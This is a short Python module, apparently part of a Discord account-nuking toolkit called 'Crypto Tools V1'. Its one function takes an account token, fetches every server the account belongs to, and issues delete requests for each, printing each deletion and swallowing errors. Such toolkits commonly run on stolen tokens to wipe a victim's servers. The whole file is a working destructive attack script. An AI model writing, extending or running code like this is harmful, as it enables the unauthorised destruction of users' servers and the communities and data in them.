import requests
from utils.common import *

def deleteServers(token):
    set_console_title("Crypto Tools V1 | Made by ೩ Eh3an_KenZo ᶜʳʸᵖᵗᵒ | Delete Servers")
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
            print(f'[ {Fore.LIGHTGREEN_EX}C{Fore.RESET} ] {Fore.LIGHTGREEN_EX}Deleted: '+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")